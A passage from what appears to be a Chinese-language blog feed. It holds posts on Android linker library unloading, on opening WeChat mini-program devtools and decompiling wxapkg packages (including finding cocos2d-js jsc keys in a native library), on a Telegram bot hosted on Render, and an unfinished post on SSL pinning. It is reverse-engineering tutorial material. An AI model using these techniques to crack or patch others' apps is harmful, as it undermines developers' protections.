and return that no GC was run. switch (gc_type) &#123; case collector::kGcTypePartial: &#123; if (!HasZygoteSpace()) &#123; // Do not increment gcs_completed_ . We should retry with kGcTypeFull. return collector::kGcTypeNone; &#125; break; &#125; default: &#123; // Other GC types don't have any special cases which makes them not runnable. The main case // here is full GC. &#125; &#125; ScopedThreadStateChange tsc(self, kWaitingPerformingGc); Locks::mutator_lock_->AssertNotHeld(self); if (self->IsHandlingStackOverflow()) &#123; // If we are throwing a stack overflow error we probably don't have enough remaining stack // space to run the GC. // Count this as a GC in case someone is waiting for it to complete. gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; bool compacting_gc; &#123; gc_complete_lock_->AssertNotHeld(self); ScopedThreadStateChange tsc2(self, kWaitingForGcToComplete); MutexLock mu(self, *gc_complete_lock_); // Ensure there is only one GC at a time. WaitForGcToCompleteLocked(gc_cause, self); if (requested_gc_num != GC_NUM_ANY &amp;&amp; !GCNumberLt(GetCurrentGcNum(), requested_gc_num)) &#123; // The appropriate GC was already triggered elsewhere. return collector::kGcTypeNone; &#125; compacting_gc = IsMovingGc(collector_type_); // GC can be disabled if someone has a used GetPrimitiveArrayCritical. if (compacting_gc &amp;&amp; disable_moving_gc_count_ != 0) &#123; LOG(WARNING) &lt;&lt; \"Skipping GC due to disable moving GC count \" &lt;&lt; disable_moving_gc_count_; // Again count this as a GC. gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; if (gc_disabled_for_shutdown_) &#123; gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; collector_type_running_ = collector_type_; last_gc_cause_ = gc_cause; &#125; if (gc_cause == kGcCauseForAlloc &amp;&amp; runtime->HasStatsEnabled()) &#123; ++runtime->GetStats()->gc_for_alloc_count; ++self->GetStats()->gc_for_alloc_count; &#125; const size_t bytes_allocated_before_gc = GetBytesAllocated(); DCHECK_LT(gc_type, collector::kGcTypeMax); DCHECK_NE(gc_type, collector::kGcTypeNone); collector::GarbageCollector* collector = nullptr; // TODO: Clean this up. if (compacting_gc) &#123; DCHECK(current_allocator_ == kAllocatorTypeBumpPointer || current_allocator_ == kAllocatorTypeTLAB || current_allocator_ == kAllocatorTypeRegion || current_allocator_ == kAllocatorTypeRegionTLAB); switch (collector_type_) &#123; case kCollectorTypeSS: semi_space_collector_->SetFromSpace(bump_pointer_space_); semi_space_collector_->SetToSpace(temp_space_); semi_space_collector_->SetSwapSemiSpaces(true); collector = semi_space_collector_; break; case kCollectorTypeCC: collector::ConcurrentCopying* active_cc_collector; if (use_generational_cc_) &#123; // TODO: Other threads must do the flip checkpoint before they start poking at // active_concurrent_copying_collector_. So we should not concurrency here. active_cc_collector = (gc_type == collector::kGcTypeSticky) ? young_concurrent_copying_collector_ : concurrent_copying_collector_; active_concurrent_copying_collector_.store(active_cc_collector, std::memory_order_relaxed); DCHECK(active_cc_collector->RegionSpace() == region_space_); collector = active_cc_collector; &#125; else &#123; collector = active_concurrent_copying_collector_.load(std::memory_order_relaxed); &#125; break; default: LOG(FATAL) &lt;&lt; \"Invalid collector type \" &lt;&lt; static_cast&lt;size_t>(collector_type_); &#125; if (collector != active_concurrent_copying_collector_.load(std::memory_order_relaxed)) &#123; temp_space_->GetMemMap()->Protect(PROT_READ | PROT_WRITE); if (kIsDebugBuild) &#123; // Try to read each page of the memory map in case mprotect didn't work properly b/19894268. temp_space_->GetMemMap()->TryReadable(); &#125; CHECK(temp_space_->IsEmpty()); &#125; gc_type = collector::kGcTypeFull; // TODO: Not hard code this in. &#125; else if (current_allocator_ == kAllocatorTypeRosAlloc || current_allocator_ == kAllocatorTypeDlMalloc) &#123; collector = FindCollectorByGcType(gc_type); &#125; else &#123; LOG(FATAL) &lt;&lt; \"Invalid current allocator \" &lt;&lt; current_allocator_; &#125; CHECK(collector != nullptr) &lt;&lt; \"Could not find garbage collector with collector_type=\" &lt;&lt; static_cast&lt;size_t>(collector_type_) &lt;&lt; \" and gc_type=\" &lt;&lt; gc_type; collector->Run(gc_cause, clear_soft_references || runtime->IsZygote()); IncrementFreedEver(); RequestTrim(self); // Collect cleared references. SelfDeletingTask* clear = reference_processor_->CollectClearedReferences(self); // Grow the heap so that we know when to perform the next GC. GrowForUtilization(collector, bytes_allocated_before_gc); old_native_bytes_allocated_.store(GetNativeBytes()); LogGC(gc_cause, collector); FinishGC(self, gc_type); // Actually enqueue all cleared references. Do this after the GC has officially finished since // otherwise we can deadlock. clear->Run(self); clear->Finalize(); // Inform DDMS that a GC completed. Dbg::GcDidFinish(); // Unload native libraries for class unloading. We do this after calling FinishGC to prevent // deadlocks in case the JNI_OnUnload function does allocations. &#123; ScopedObjectAccess soa(self); // 调用 JNI_OnUnload soa.Vm()->UnloadNativeLibraries(); &#125; return gc_type;&#125;# call_destructors call_destructors 函数如下，我们向上找找看交叉引用 //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_destructors() &#123; if (!constructors_called) &#123; return; &#125; ScopedTrace trace((std::string(\"calling destructors: \") + get_realpath()).c_str()); // DT_FINI_ARRAY must be parsed in reverse order. call_array(\"DT_FINI_ARRAY\", fini_array_, fini_array_count_, true, get_realpath()); // DT_FINI should be called after DT_FINI_ARRAY if both are present. call_function(\"DT_FINI\", fini_func_, get_realpath());&#125;# soinfo_unload_impl 这里我们发现 log 代码中都出现了 dlclose 字样，那么显而易见这应该和 dlclose 脱不了干系，在往上看看 //platform\\bionic\\linker\\linker.cppstatic void soinfo_unload_impl(soinfo* root) &#123; ScopedTrace trace((std::string(\"unload \") + root->get_realpath()).c_str()); bool is_linked = root->is_linked(); if (!root->can_unload()) &#123; LD_LOG(kLogDlopen, \"... dlclose(root=\\\"%s\\\"@%p) ... not unloading - the load group is flagged with NODELETE\", root->get_realpath(), root); return; &#125; soinfo_list_t unload_list; unload_list.push_back(root); soinfo_list_t local_unload_list; soinfo_list_t external_unload_list; soinfo* si = nullptr; // 将要卸载的 so 的 soinfo 添加到 local_unload_list 中 while ((si = unload_list.pop_front()) != nullptr) &#123; if (local_unload_list.contains(si)) &#123; continue; &#125; local_unload_list.push_back(si); if (si->has_min_version(0)) &#123; soinfo* child = nullptr; while ((child = si->get_children().pop_front()) != nullptr) &#123; TRACE(\"%s@%p needs to unload %s@%p\", si->get_realpath(), si, child->get_realpath(), child); child->get_parents().remove(si); if (local_unload_list.contains(child)) &#123; continue; &#125; else if (child->is_linked() &amp;&amp; child->get_local_group_root() != root) &#123; external_unload_list.push_back(child); &#125; else if (child->get_parents().empty()) &#123; unload_list.push_back(child); &#125; &#125; &#125; else &#123; async_safe_fatal(\"soinfo for \\\"%s\\\"@%p has no version\", si->get_realpath(), si); &#125; &#125; local_unload_list.for_each([](soinfo* si) &#123; LD_LOG(kLogDlopen, \"... dlclose: calling destructors for \\\"%s\\\"@%p ... \", si->get_realpath(), si); // 调用 call_destructors 执行 final_array 和 final 函数 si->call_destructors(); LD_LOG(kLogDlopen, \"... dlclose: calling destructors for \\\"%s\\\"@%p ... done\", si->get_realpath(), si); &#125;); // 进行 soinfo 最后的收尾工作 while ((si = local_unload_list.pop_front()) != nullptr) &#123; LD_LOG(kLogDlopen, \"... dlclose: unloading \\\"%s\\\"@%p ...\", si->get_realpath(), si); ++g_module_unload_counter; notify_gdb_of_unload(si); unregister_soinfo_tls(si); if (__libc_shared_globals()->unload_hook) &#123; __libc_shared_globals()->unload_hook(si->load_bias, si->phdr, si->phnum); &#125; get_cfi_shadow()->BeforeUnload(si); soinfo_free(si); &#125; if (is_linked) &#123; while ((si = external_unload_list.pop_front()) != nullptr) &#123; LD_LOG(kLogDlopen, \"... dlclose: unloading external reference \\\"%s\\\"@%p ...\", si->get_realpath(), si); soinfo_unload(si); &#125; &#125; else &#123; LD_LOG(kLogDlopen, \"... dlclose: unload_si was not linked - not unloading external references ...\"); &#125;&#125;# soinfo_unload soinfo_unload_impl 被 soinfo_unload 调用，主要让引用计数减一，然后调用核心的卸载逻辑 //platform\\bionic\\linker\\linker.cppstatic void soinfo_unload(soinfo* unload_si) &#123; // Note that the library can be loaded but not linked; // in which case there is no root but we still need // to walk the tree and unload soinfos involved. // // This happens on unsuccessful dlopen, when one of // the DT_NEEDED libraries could not be linked/found. // 这个 so 不管有没有被链接，只要加载了，那必须得 unload 卸载 bool is_linked = unload_si->is_linked(); soinfo* root = is_linked ? unload_si->get_local_group_root() : unload_si; LD_LOG(kLogDlopen, \"... dlclose(realpath=\\\"%s\\\"@%p) ... load group root is \\\"%s\\\"@%p\", unload_si->get_realpath(), unload_si, root->get_realpath(), root); // 如果被其他库链接了 (其实就是被引用了), 那卸载的时候引用计数就 - 1 size_t ref_count = is_linked ? root->decrement_ref_count() : 0; if (ref_count > 0) &#123; LD_LOG(kLogDlopen, \"... dlclose(root=\\\"%s\\\"@%p) ... not unloading - decrementing ref_count to %zd\", root->get_realpath(), root, ref_count); return; &#125; // 执行核心 unload 操作 soinfo_unload_impl(root);&#125;# do_dlclose 果不其然，是调用 do_dlclose 来进行卸载的 //platform\\bionic\\linker\\linker.cppint do_dlclose(void* handle) &#123; ScopedTrace trace(\"dlclose\"); ProtectedDataGuard guard; soinfo* si = soinfo_from_handle(handle); if (si == nullptr) &#123; DL_OPEN_ERR(\"invalid handle: %p\", handle); return -1; &#125; LD_LOG(kLogDlopen, \"dlclose(handle=%p, realpath=\\\"%s\\\"@%p) ...\", handle, si->get_realpath(), si); // 卸载 soinfo soinfo_unload(si); LD_LOG(kLogDlopen, \"dlclose(handle=%p) ... done\", handle); return 0;&#125;# __loader_dlclose //platform\\bionic\\linker\\dlfcn.cppint __loader_dlclose(void* handle) &#123; ScopedPthreadMutexLocker locker(&amp;g_dl_mutex); int result = do_dlclose(handle); if (result != 0) &#123; __bionic_format_dlerror(\"dlclose failed\", linker_get_error_buffer()); &#125; return result;&#125;# dlclose 最终来到了 dlclose 这个函数，但是因为 dlclose 的调用实在是太多了，我们很难去找到究竟是哪一个函数调用的 dlclose 来对这个 so 执行最终的卸载操作 //E:\\android-platform\\bionic\\libdl\\libdl.cpp__attribute__((__weak__))int dlclose(void* handle) &#123; return __loader_dlclose(handle);&#125;# 注释中的矛盾点 我们向前看看 android 开发者留给我们的注释 //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; ... // 阶段二：加载 so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // 调用 dlopen 打开目标 so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; ...&#125; Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. 当调用 dlopen 加载 so 时，会增加一次对 so 的引用计数，而当引用计数变成 0 之后，便会自动调用 dlclose 卸载 so //android-platform\\bionic\\linker\\linker.cppstatic soinfo* find_library(android_namespace_t* ns, const char* name, int rtld_flags, const android_dlextinfo* extinfo, soinfo* needed_by) &#123; soinfo* si = nullptr; ... // 加载 so 成功，so 的引用次数 + 1, 对应了 JavaVMExt::LoadNativeLibrary 中 //so 加载时 这一部分的注释↓ /* Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. */ si->increment_ref_count(); return si;&#125;所以现在我们的目标从谁调用了 dlclose 变成了谁调用了 soinfo::decrement_ref_count , 但是在 soinfo_unload 中，不是已经调用过 decrement_ref_count 了吗，这段注释和实际的情况怎么看起来相互矛盾？我们期望的函数调用是 anonymous_func-&gt;decrement_ref_count-&gt;dlclose , 但是实际的调用流是 dlclose-&gt;decrement_ref_count , 这完全是相反的调用过程呀 # 编写 demo 观察卸载函数调用先后情况 现在我们光从源码已经很难再逆向分析出最终是在哪一个函数中依次调用了 JNI_OnUnload 和 call_destructors , 所以我们需要实际动手写一个测试 demo, 通过打印日志的方式，通过 logcat 来观察实际的调用情况 #include &lt;jni.h>#include \"stdio.h\"#include &lt;dlfcn.h>extern \"C\"&#123;#include &lt;android/log.h>#define TAG \"oacia_tag\" // 这个是自定义的 LOG 的标识#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__)jint JNI_OnLoad(JavaVM* vm, void* reserved __unused)&#123; LOGD(\"JNI_OnLoad called\"); return JNI_VERSION_1_6;&#125;__attribute((constructor)) void before_main()&#123; LOGD(\"constructor called!\");&#125;__attribute((destructor)) void after_main()&#123; LOGD(\"destructor called!\");&#125;void JNI_OnUnload(JavaVM* vm, void* reserved __unused)&#123; LOGD(\"JNI_OnUnload called\");&#125;&#125;然而当退出 app 时，不论 JNI_OnUnload 还是 destructor 均没有被调用，走到这里看起来已经进入死胡同了，可能这两个函数从未被调用… 那暂时先到此为止吧～要是未来有新的发现的话再继续卸载过程的分析 # 参考资料 Android Linker 学习笔记 Android 系统加载 so 的源码分析 Android 动态修改 Linker 实现 LD_PRELOAD 全局库 PLT Hook","categories":[],"tags":[]},{"title":"微信小程序devtool抓包+反编译wxapkg","slug":"wechat-mini-program-with-devtool","date":"2024-01-30T07:55:11.000Z","updated":"2025-04-08T18:55:12.118Z","comments":true,"path":"wechat-mini-program-with-devtool/","link":"","permalink":"https://oacia.dev/wechat-mini-program-with-devtool/","excerpt":"","text":"今天闲来无事，上网冲浪，突然发现一个令我眼前一亮的项目 WeChatOpenDevTools-Python, 这这这，看 README 的介绍，我岂不是可以在小程序里面开 devtool 了吗！？ 想来 2022 年也有个小程序羊了个羊爆火那会儿，我也对小程序逆向分析玩了玩，然后做了个破解版的自娱自乐了一下 (当然也是算朋友圈排名滴), 当时拿 UnpackMiniApp.exe 解密了 wxapkg 格式的小程序，然后用 wxappUnpacker 弄出了小程序的 js 源码来，审计一下找到修改的地方 patch 逻辑到最开始的 wxapkg 包就破解好了 虽然但是，那时我就在想微信小程序既然用的是浏览器的内核，那么必定是有方法可以开启开发者工具的，不过由于当时在网上还没发现这样的技术所以也就只是一个想法了，现在正巧碰到了大佬开源了能够开启微信小程序的项目，于是我便想看看小程序 + devtool 逆向的感觉究竟是如何的呢～ 碰巧身边的人在玩咸鱼之王 (虽然我没玩过), 但是它毕竟是一个小程序，那就拿它来浅浅尝试一下 devtool 逆向的感觉是怎么样的咯 ^.^ 让微信小程序开启 devtool 有被封号的风险，请务必使用小号登录电脑版微信！！！ # 微信开启 devtool 从 github 上下载项目 git clone https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python.git 下载项目依赖 pip install -r requirements.txt 需要先打开电脑版微信并登录 运行 main.py python main.py随便开一个小程序，出现下列信息则代表 devtool 开启成功 点一下小程序右上角的三个点 就可以开启 devtool 啦 # 反编译 wxapkg devtool 可以帮助我们更加方便的抓到小程序的包，但是我们还需要通过反编译 wxapkg 拿到小程序的源代码，因为在 devtool 的 source 里面，小程序的源码都被整合到了一个 js 里面很难看出代码的层次结构 # 提取 wxapkg Windows 默认小程序的存放路径为 C:\\Users\\&#123;系统用户名&#125;\\Documents\\WeChat Files\\Applet\\&#123;小程序的AppID&#125;\\ # 解密 wxapkg 使用 pc_wxapkg_decrypt_python 来解密 wxapkg python .\\main.py --wxid wx0840558555a454ed --file .\\__APP__.wxapkg --output dec.wxapkg # 解包 wxapkg 使用 wxappUnpacker 来解包 wxapkg 由于咸鱼之王小程序的包是有子包的，所以需要使用 - s 参数 .\\bingo.bat .\\dec.wxapkg -s=_subpackages_game_.wxapkg解包成功～ 简单看了一下文件结构，这游戏看起来是用 coco2djs 写的，而且这 js 也没有加密全是源码，hmmm 再逆下去不就变成代码审计了吗… 那就到此为止咯：) # 其他 就这样结束似乎有点太潦草了，所以这里是我别的一些想法 既然咸鱼之王用的是 coco2djs, 而在官网的描述中，coco2d 是跨平台的，那我要是开发人员，肯定在安卓上用的也是 coco2d 果不其然，下了一个 apk 版的咸鱼之王解包之后，真的在里面发现了 libcocos2djs.so 有趣的是在 assets 目录下有 libjiagu.so , 这明显是套了一个 360 加固想要为难逆向的人呀 但 360 加固的是 dex, 但是 coco2d 的源码不全是 js 写的嘛？唯一的作用应该就是防止重打包了吧 而且这个源代码甚至连 coco2dx-js 内置的把源码加密成 jsc 的功能都没有，这下连密钥都不用找了… 那顺便记录一下加密成 jsc 类似下图的样子该如何应对吧 很简单， 010editor 打开 libcocos2djs.so 全局搜索 jsb-adapater , 它前面那一串字符串就是 jsc 的密钥 拿到了密钥，用 cocoscreatorjscdecrypt 就可以解密出源码来了","categories":[],"tags":[]},{"title":"telegram bot 初体验及云端部署","slug":"telegram-bot-develop","date":"2023-12-31T13:08:18.000Z","updated":"2025-04-08T18:55:11.971Z","comments":true,"path":"telegram-bot-develop/","link":"","permalink":"https://oacia.dev/telegram-bot-develop/","excerpt":"","text":"# 前言 为什么突然想要去做一个 telegram bot 了呢？ 这就要说到困扰我很久的一个小问题了，我在刷抖音的过程中，看到有意思的视频或者好看的图片，就很想要把它们给保存下来，作为壁纸或者和别人分享，但是有的时候 保存本地 这个选项是灰色的不让我去保存 而且抖音在图片保存的过程中总是会打上水印，就像下面这个样子，倘若用作壁纸或者日常打开来看的时候就感觉十分的… 别扭 这个时候，我就会把抖音的视频或图文分享链接复制下来，打开微信小程序，找到一个可以抖音无水印下载的小程序，忍受几十秒广告的煎熬之后，终于可以成功的把图片保存到本地，听起来相当的不便吧，然而我已经进行上面的操作不知多少次了，所以亟需一个更加方便的方式来帮助我减少无意义时间的消耗 而在抖音收藏夹图文批量获取这篇 blog 中，我已经利用 python 代码下载到了抖音上的无水印的视频和图片，那么现在要做的就是如何便捷的运行这段 python 代码并返回视频或图片，这个时候我想到了 telegram bot , 因为 tg 我日常也是在用的，打开速度快，界面简洁都是我选择它的原因，而 telegram bot 算是 telegram 的特色吧，之前总是觉得 bot 是个神秘的存在，但是这两天的 bot 做下来，发现其实是相当的简单的，阅读纯英文文档，自我探索的过程也同样充满的乐趣！而且我认为之后我还可以向这个 bot 中加入更多的有创造力的，提高生活效率的功能，敬请期待～ 可以来玩玩这个 bot 噢～https://t.me/oacia_bot bot 的源代码发布在 github 上面 https://github.com/oacia/oacia_bot # tg bot python 库选择 既然我们选定了核心代码是用 python 编写的，那么选择一个简单易上手的 telegram bot 集成库就显得非常有必要啦，他们封装了 telegram 官方的 bot api, 我们只需要调用 python 库作者集成的函数就可以方便的使用 bot api 的各种功能，现在主流的 tg bot python 库分别是 telethon telebot python-telegram-bot 我最终选择的库是 telethon, 原因很简单， 官方文档写的实在是太详细了！而 telebot 我也尝试了，然而 API 的变化实在是太大了，网上使用旧版本的 telebot 所展示的代码完全没有参考价值，python-telegram-bot 用法很复杂，官方文档写的也不是很详细导致我用起来相当痛苦… # telegram bot 什么是 telegram bot? 这是官方文档中的介绍 Bots are small applications that run entirely within the Telegram app. Users interact with bots through flexible interfaces that can support any kind of task or service. 它其实本质上是基于 Telegram 客户端的第三方程序，我们给机器人发送消息，机器人通过代码处理我们发送的消息之后，再发送回消息给我们，类似于下面我和我的 bot 的简单交互 # bot 实现简单的交互 大家可以看到上方我们刚刚实现了一个简单的交互，接下来我们用 telethon 来实现一下吧～ 首先安装 telethon pip install telethon代码长这个样子的，一眼看上去是不是很简单呢～ from telethon import TelegramClient, eventsapi_id = 12345678,api_hash = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",bot_token: \"1234567890:aaaaaaaaaaaaaaaaa-bbbbbbbbbbbbbbbbbb\",session: \"oacia_bot\",proxy = (\"HTTP\", \"127.0.0.1\", 7890)client = TelegramClient(session, api_id, api_hash, proxy=proxy).start(bot_token=bot_token)@client.on(events.NewMessage(pattern='(.*)'))async def hello(event): user = await client.get_entity(event.peer_id.user_id) await event.reply(\"bot has received your message!\") await client.send_message(user,f\"wow!&#123;user.username&#125;, you say &#123;event.text&#125;\") client.run_until_disconnected()这里的 api_id , api_hash 和 bot_token 我将会介绍获取的方法 api_id , api_hash 和 bot_token 千万不要泄漏给其他人，千万不要！！ # api_id api_hash 首先前往 https://my.telegram.org/, 输入手机号，在 telegram 上接收到 login code 后进入 随后点击这里的 API development tools 去创建一个 app, 这里的数据随便填也是没问题的，如果网页一直报错 ERROR , 那么百分之九十是代理的问题，一直换代理直到成功创建 app 在 App configuration 的位置就可以得到 api_id 和 api_hash # bot_token 想要创建 telegram bot, 我们需要发送消息给 botfather, 通过 /newbot 命令，输入 bot 的 name 和 username 之后，我们的 bot 就被创建好啦～红框框里面的 token 就是我们的 bot_token 之后将上面获取到的三个参数填入代码，运行 python 脚本，访问 t.me/[username] , 就可以和我们创建的机器人交互啦 # bot 云端部署 因为本人从未拥有过一台属于自己的服务器 (二进制根本不需要服务器滴！😄), 所以就将目光转向了网上免费的云服务部署上，经过下面那么多云服务的尝试，我最终选择将服务部署在 render 上面了 # google colab 一开始我是在 google 的 colab 上面执行 bot 代码的，直接在 google 云端硬盘里面创建一个 ipynb 文件并点击就可以进入 colab 了，但是 colab 只能连续运行 12 个小时，pass # github codespace 后来我把 bot 代码放到 github 的 codespace 里面运行，没想到只能运行几十分钟就断开了 qaq # vercel 之后我又想到了 vercel, 毕竟之前就有过 vercel 部署静态网站的经验，并且去看了 vercel 的官方文档，是可以支持 python 的运行时的，Using the Python Runtime with Serverless Functions 但是它只能通过访问相应的 api 路由来触发函数的执行，而 telethon 使用的是 MTProto 协议直接和 telegram 服务器建立连接，并不需要对外开放一个路由，这就意味着 telethon 在 vercel 上将无法使用 MTProto is Telegram’s own protocol to communicate with their API when you connect to their servers. Telethon is an alternative MTProto-based backend written entirely in Python and much easier to setup and use. 因此我又去阅读了 telebot 的官方文档，照着 Flask-ChatGPT-TelegramBot-Vercel 里面的代码重构了原本的脚本 这里我们就需要使用 telegram 的 webhook 功能 什么是 webhook? 简单的说就是将 telegram 服务器发送给 bot 的 message 同时也转发到设定的一个 url 上，消息的 json 格式如下方所示，我们可以处理这个消息并返回给发送消息方相应的消息 &#123;ok: true,result: [ &#123; update_id: 11223344, message: &#123; message_id: 2, from: &#123; id: 123456789, is_bot: false, first_name: \"\", username: \"\", language_code: \"en\" &#125;, chat: &#123; id: 123456789, first_name: \"\", username: \"\", type: \"private\" &#125;, date: 1558784616, text: \"My first message to this bot\" &#125; &#125; ]&#125; 设置 webhook 方法很简单，浏览器访问这个网站就可以了 https://api.telegram.org/bot&#123;$token&#125;/setWebhook?url=&#123;$webhook_url&#125; 这样做了之后确实是可以进行简单的交互的，但是当我让 bot 执行下载抖音图片这种耗时任务的时候，vercel 免费版的弊端就体现出来了， 一个函数最长只能执行 10 秒，10 秒后这个函数将会被强制停止，太艰难了，只能重新找找其他方法咯 # render 最终我的 bot 代码是部署在 render 上面的，免费版每个月 750 小时完全够用了 (要知道一个月最长也就 744 小时呢) 首先我们去 render 上注册一个账号 然后在右上角点击 New , 并创建一个 Web Service 选择 Build and deploy from a Git repository 并点击 Next 你可以将 oacia_bot fork 到你的仓库里面，或者直接用 bot 仓库的 git 链接来创建 https://github.com/oacia/oacia_bot 之后就是设定运行的环境了，名称不重复就可以了，region 表示服务器，哪个服务器离你近就选哪个 接下来这个 Start Command 需要填入 python main.py , 服务器示例选择免费就够用了 再往下看，我们要设定这四个环境变量，前面三个我们之前就获取过了，填入即可，这个 RENDER_NAME 是我们刚刚创建的 Web Service 的名称 这个 RENDER_NAME 的作用是给 bot 设置 webhook 用的，为什么要这样做呢？ 因为 render 的免费云服务同样有一个限制，就是如果 15 分钟内没有流量访问我们创建的 web 服务，那么这个服务将会被暂停，直到有流量经过 web 服务时，这个服务才会被重新启动，而我所使用的是 telethon, 要直到服务关了可就是真关了，telethon 创建的 client 也因此无法和 telegram 服务器通信了 所以我的做法是给 bot 设置了一个 webhook render_name = os.getenv(\"RENDER_NAME\")if render_name: requests.post(f\"https://api.telegram.org/bot&#123;bot_token&#125;/setWebhook?url=https://&#123;render_name&#125;.onrender.com/webhook\") if requests.status_codes == 200: print(\"set webhook successful\")并用 flask 开放了一个 webhook 的路由 # render 必须得起一个 http 服务，否则就会断开连接....from flask import Flaskapp = Flask(__name__)@app.route('/')def home(): return \"hello world\"@app.route('/webhook')def webhook(): return 'ok'if __name__ == \"__main__\": app.run(host='0.0.0.0', port=10000)当有人给 bot 发消息时，telegram 服务器同时也会给我们设置的 webhook 网址发送一个 post 的 http 请求，这样我们的 render 服务即使因为 15 分钟没有流量经过而被暂停了，也会因为 telegram 服务器的流量经过而被重启，telethon 就可以再次成功的和 telegram 服务器通讯啦，这也就意味着 bot 可以一直在 render 上面运行 ~♪(^∇^*)","categories":[],"tags":[]},{"title":"(doing)https双向认证及绕过方法","slug":"two-way-SSL","date":"2023-12-14T10:00:32.000Z","updated":"2025-04-08T18:55:12.017Z","comments":true,"path":"two-way-SSL/","link":"","permalink":"https://oacia.dev/two-way-SSL/","excerpt":"","text":"日常的 APP 为了不被别人通过抓包软件抓取与服务器通信的流量，所以会在流量的安全传输上做文章，最安全的做法当然是使用私有协议 (即协议格式不公开的协议), 例如抖音的 quic 协议，咸鱼的 spdy 协议等等，利用这些私有协议包装流量，从而使抓包工具无法识别出这串流量的实际内容是什么，所以就只能放行这段流量，面对私有协议倘若利用 reqable , fiddler , charles 等去抓包是抓不到的，而唯一能够抓到这段流量的就是 wireshark , 并且还需要对这段流量编写特定的脚本解析才可以知道这段流量所携带的实际数据 除了私有协议之外，想让流量上的安全还可以使用 SSL pinning 的方法来阻止中间人抓包的发生，如何进行 HTTPS 双向认证以及使用 frida 对 SSL pinning 进行绕过是本文所要讨论的重点 # SSL pinning 虽然 HTTPS 采用了公钥和证书的加密和验证方式，但依然存在 MIM (中间人攻击) 的可能性，因为证书颁发机构可能被黑客入侵，而 HTTPS 只验证了证书的合法性，并没有验证当前服务器是否是我们要访问的服务器，所以需要客户端去验证服务端证书的合法性，这就是 SSL pinning , 它还是 HTTPS 单向认证的范畴之内。 我们可以看一下目前抓包工具 Charles 所采取的抓包方法 为了保证我们当前访问的服务器就是我们需要访问的服务器，防止中间人攻击的发生，需要通过 SSL pinning 的方式来实现，其包括 Certificate Pinning 和 Public Key Pinning 两种。 # 证书锁定 证书锁定需要把服务器的证书提前下载并内置到客户端中，当请求发起时，通过比对证书内容来确定连接的合法性，但由于证书存在过期时间，因此当服务器端证书更换时，需同时更换客户端证书。 既然是要锁定证书，那么我们客户端上应该事先存在一个证书，我们才能锁定这个证书来验证我们真正的服务端，而不是代理工具伪造的服务端。 如果是锁定证书，那通常情况下会将证书放置在 app/asset 目录下。 具体操作：将 APP 代码内置仅接受指定域名的证书，而不接受操作系统或者浏览器内置的 CA 根证书对应的任何证书。 通过这种授权方式，保障了 APP 与服务端通信的唯一性和安全性，因此移动端 APP 与服务端（例如 API 网关）之间的通信可以保证绝对的安全。 # 公钥锁定 公钥锁定则需提取证书中的公钥内置到客户端中，通过比对公钥值来验证连接的合法性，由于证书更换依然可以保证公钥一致，所以公钥锁定不存在客户端频繁更换证书的问题，并且之后我们所使用的 SSL pinning 也同样是公钥锁定。 # HTTPS 双向认证原理 双向验证，顾名思义就是客户端验证服务器端证书的正确性，服务器端也验证客户端的证书正确性，即 服务端使用 ca.crt 校验客户端的 client.crt 和 client.key 客户端使用 ca.crt 校验服务端的 server.crt 和 server.key 详细的 HTTPS 连接过程如下图所示，其中的 root.crt 即 ca.crt 客户端发起建立 HTTPS 连接请求，将 SSL 协议版本的信息发送给服务端； 服务器端将本机的公钥证书（server.crt）发送给客户端； 客户端读取公钥证书（server.crt），取出了服务端公钥； 客户端将客户端公钥证书（client.crt）发送给服务器端； 服务器端使用根证书（root.crt）解密客户端公钥证书，拿到客户端公钥； 客户端发送自己支持的加密方案给服务器端； 服务器端根据自己和客户端的能力，选择一个双方都能接受的加密方案，使用客户端的公钥加密后发送给客户端； 客户端使用自己的私钥解密加密方案，生成一个随机数 R，使用服务器公钥加密后传给服务器端； 服务端用自己的私钥去解密这个密文，得到了密钥 R 服务端和客户端在后续通讯过程中就使用这个密钥 R 进行通信了。 # 自签名证书 # 证书准备 在制作证书前，我们先来了解一下每一个证书的格式 JKS：数字证书库。JKS 里有 KeyEntry 和 CertEntry，在库里的每个 Entry 都是靠别名（alias）来识别的。 P12：是 PKCS12 的缩写。同样是一个存储私钥的证书库，由 .jks 文件导出的，用户在 PC 平台安装，用于标示用户的身份。 CER：俗称数字证书，目的就是用于存储公钥证书，任何人都可以获取这个文件 。 BKS：由于 Android 平台不识别 .keystore 和 .jks 格式的证书库文件，因此 Android 平台引入一种新的证书库格式，BKS。 整个双向认证的流程需要六个证书文件： 服务器端公钥证书：server.crt 服务器端私钥文件：server.key 根证书：root.crt 客户端公钥证书：client.crt 客户端私钥文件：client.key 客户端集成证书（包括公钥和私钥，用于安卓访问场景）：client.bks # 证书制作 